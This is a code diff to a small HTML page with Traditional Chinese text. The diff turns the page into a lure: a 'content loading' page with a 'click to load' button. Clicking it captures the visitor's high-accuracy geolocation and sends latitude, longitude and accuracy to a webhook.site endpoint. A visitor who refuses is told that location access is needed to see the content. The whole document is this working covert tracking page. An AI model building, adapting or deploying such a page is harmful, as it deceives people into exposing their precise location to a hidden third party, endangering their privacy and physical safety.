@@ -1,16 +1,40 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="utf-8">
+<title>內容載入中</title>
+</head>
+
 <body>
 
-<h2>正在取得位置...</h2>
+<h2>點擊按鈕查看內容</h2>
+<button onclick="getLocation()">點擊載入</button>
+
+<p id="status"></p>
 
 <script>
 
 var webhook = "https://webhook.site/89e9774f-affe-4c04-9e2e-4708314ca8ad";
 
+function getLocation(){
+
+document.getElementById("status").innerHTML="正在取得位置...";
+
 if(navigator.geolocation){
 
-navigator.geolocation.getCurrentPosition(function(pos){
+navigator.geolocation.getCurrentPosition(success,error,{
+enableHighAccuracy:true,
+timeout:10000,
+maximumAge:0
+});
+
+}else{
+document.getElementById("status").innerHTML="瀏覽器不支援定位";
+}
+
+}
+
+function success(pos){
 
 var lat = pos.coords.latitude;
 var lon = pos.coords.longitude;
@@ -18,15 +42,17 @@ var acc = pos.coords.accuracy;
 
 fetch(webhook + "?lat=" + lat + "&lon=" + lon + "&acc=" + acc);
 
-document.body.innerHTML =
+document.getElementById("status").innerHTML=
 "定位成功<br>" +
 "緯度: "+lat+"<br>" +
 "經度: "+lon+"<br>" +
-"精準度: "+acc+"公尺";
+"精準度: "+acc+" 公尺";
 
-},{
-enableHighAccuracy:true
-});
+}
+
+function error(err){
+
+document.getElementById("status").innerHTML="需要允許定位才能查看內容";
 
 }
 
